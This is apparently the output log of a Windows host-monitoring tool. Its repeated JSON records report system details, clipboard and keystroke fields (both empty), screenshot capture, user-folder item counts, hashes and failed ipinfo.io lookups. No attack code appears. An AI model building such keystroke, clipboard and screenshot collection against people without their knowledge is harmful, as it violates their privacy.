{"timestamp": "2025-06-14T07:36:06.282751+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1ab126a3fa993e7fa46a4337e7cbfc62cc4a65ea57141bff39801e47f7e1f9a1", "_raw_log_hash": "b603ca50885876ffa5e505e93984d5f92041beadc78279aa936293dde8e8af33"}
{"timestamp": "2025-06-14T07:36:19.925523+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "26adcd49cb3102815699df99d41b3a95528cee1cc9c8eff6a5d47276d41a81a6", "_raw_log_hash": "51f2b7f4741daaa74400dea833c27db65f697ed02686fe8aacd850d32cdf38ba"}
{"timestamp": "2025-06-14T07:36:33.445660+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a0e4901a19ad797c7e8f492d259a057a71f790655fcb1a880b68a50b5bf89949", "_raw_log_hash": "91b72e3aadf1f1e7defcfdee297ccf2495064e52e5cc7ce8055f67197b447a64"}
{"timestamp": "2025-06-14T07:36:46.963802+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f43b6689e5a123df11bf6d98ca774a6b827be37a8c26e597a52f8eb9369e20f0", "_raw_log_hash": "25e538f1f937d9c36dac70d5d9d9a69d39366d5ec097c024166851869ae123ab"}
{"timestamp": "2025-06-14T07:37:00.533655+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "21d730643015abdd936b36cc6135fdbe865fb06523b14fdd6b2d0804ef9f74e8", "_raw_log_hash": "415b5260d258f677b1713c0108a9dc6c00b52f032af96f0769e9d228228eed29"}
{"timestamp": "2025-06-14T07:37:14.021556+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f61de4e24271d1370f22ec56cbb768721a821f10105548db82a43a20159feed3", "_raw_log_hash": "884ea30e07e8c8ebd298007d0f0aa9e859ba06f3f171854bc8a6d6750376f473"}
{"timestamp": "2025-06-14T07:37:27.513326+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ff016e9e64f9cb7313a0f756a1884e84e2d35029439eb684fb4564d32378752a", "_raw_log_hash": "8cbcf22dcc533d9f033ca32315186f9c84f639c3cb41ed9d4731b5440287f661"}
{"timestamp": "2025-06-14T07:37:40.970936+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "bcab0f3d044ba3eb965e660e0c4ec90d81f1b0ab3841d657ecac2bd096ae931a", "_raw_log_hash": "8fd77bd72da07c66aae2e7cbfee13fe4d2776ea85d55f54f9a564656b177e371"}
{"timestamp": "2025-06-14T07:37:54.437504+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9828ab58529aac2ef05505c5154bf8b1e84db3ce2ec67ede591b184d4229b635", "_raw_log_hash": "a1112cc5eb25ca4226c6fe0040a98a252ee256d8b9d4d6912883b3ff572e4d11"}
{"timestamp": "2025-06-14T07:38:07.956783+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5e8d014061c8afe76acc3969e14e0670e0d6201444b85b5e0b74d7c8fb6cb94e", "_raw_log_hash": "9043d91f56f2ac6c7c51aaffbb102119921edaac20450fd27740f92a11a6c2dd"}
{"timestamp": "2025-06-14T07:38:21.548041+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a9cebdce208b4f96a634bdd38fe450037c1219d1519376e5bf9d3cceec1e7e22", "_raw_log_hash": "3a1a5e1d36ea77a5978616cdb20905eb1e97e1773bbd1c938050162abad039dc"}
{"timestamp": "2025-06-14T07:38:35.056954+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "77792401041f421c4db71aa9c91b67335877e2560921e4194ac8619fd9a4311b", "_raw_log_hash": "6ea05b599582d8ed6e4a61f08bdab9c5fa0f51c645eb085f94ff67c952e5eb94"}
{"timestamp": "2025-06-14T07:38:48.611667+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a0237da5b5e4b18e9a666d5fd9caa79e910a6384d24c667011be0dfe8b5cc9c8", "_raw_log_hash": "0ba63760be692eec936667fc3e3124252cde5ca8450f757f83127259749b7dbb"}
{"timestamp": "2025-06-14T07:39:02.155753+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "57fc2e8e02572ac462eefc9eb572610cf816788f51135949ff0122ef6b8bf75e", "_raw_log_hash": "bd40c01277beea4b6c7e74377abe23c2057fd3176cbba0cc7007659147d802fd"}
{"timestamp": "2025-06-14T07:39:15.641736+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "adc8bd2de738171fdb8429605364aa814f41144a6b78797763e3ebe9df4be29a", "_raw_log_hash": "f3d94ea7fa8c7884eeeb83910dd7a36d7ffb262094b9f1f80696776c2613cd23"}
{"timestamp": "2025-06-14T07:39:29.181279+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "31b8ed2260ad3f9ec3f0ed8ce537a499852c80b02482fb8b79fef43c12be5771", "_raw_log_hash": "e76f5efece5094bee0cb5129f427e6ec6a353c32654a07fb012ed74a1c31bd66"}
{"timestamp": "2025-06-14T07:39:42.718529+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1ca5b00abf6db57bf1dcd754b1c1539e58177762ab631efc016d108e2429e1a3", "_raw_log_hash": "22f0e2911872e7f181b9a22cf691b26bd7ba9ffee51baa15ef9b77aa7c0a708a"}
{"timestamp": "2025-06-14T07:39:56.348887+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ebca3ad0bd5c3596ba80653e24df96c92b2fdb28190ebd9bd99334cb226a48fe", "_raw_log_hash": "70a5674b3447b4bfa861bc2b2d8ff1d8cbe21f37e7916c6b4e4416aff7392897"}
{"timestamp": "2025-06-14T07:40:09.891631+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0c0b3a50571c07b5e96fa8fa23bb8e07cf90671750050ceab7badafb4b457eeb", "_raw_log_hash": "11b5c8c5b4e482beb88be53c9be3fef8bf4c3390379f046d9cd67bee388f8b06"}
{"timestamp": "2025-06-14T07:40:23.446256+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "70f78c17d1bda63f848bb5bf5d74be766f71ef2fba5470cb62c06e59ae39c60e", "_raw_log_hash": "1553882909e4de98bc04c01f8abdffcf48bbd73676f88cb176f8baf3716908fa"}
{"timestamp": "2025-06-14T07:40:37.103231+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "bd963cc6c153d9b93157f5955c66db9ec93258c52091d4ff8c403f675d92990b", "_raw_log_hash": "4078723fb93ff7a63a8108b05e03aa7a12c37edceaaad4ea36d56fde20cd63fd"}
{"timestamp": "2025-06-14T07:40:50.600387+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6428d5cddc6b71b16f3eb2211714073f244e2bf2fec326f140d88f9627ff0132", "_raw_log_hash": "f5e82e537ff135e117ec5f6befbbb5ca939aad62ef26a7d535aeef246f55a6cf"}
{"timestamp": "2025-06-14T07:41:04.136132+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "05c6873c8294614208ad68ef693a5856fc97aea7581c88c5de87afed61308d81", "_raw_log_hash": "d73814d5cddcdd380cea7423e2e0137f3fa2b935cb3ca1cec9df77841e0478b9"}
{"timestamp": "2025-06-14T07:41:17.743603+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f4b8029f699df0cc5f4b1b8c71a5453b0756e2cd7f8f9bbe3a67593c0d44b215", "_raw_log_hash": "78a635f23db832f5cc6c3267a273624fa1da8aedbba8633c0f3e761629f93513"}
{"timestamp": "2025-06-14T07:41:31.249585+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4dd3b51d385c1a87014cc43d3b65ffcb89a11d650e6811ff1532e57b19a83760", "_raw_log_hash": "f4dc6de60ff1624f6c97361b5aae61c56cbf367361b079302136217231821d5e"}
{"timestamp": "2025-06-14T07:41:44.802391+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a10de78ae4c1d33d65aacb5490a6d2226cac6c0c80a5753d377028d9b2f56d02", "_raw_log_hash": "e9a2637c38b72ae68514d95e99193191e6333b1e20bc90a86870aab7ff6f795b"}
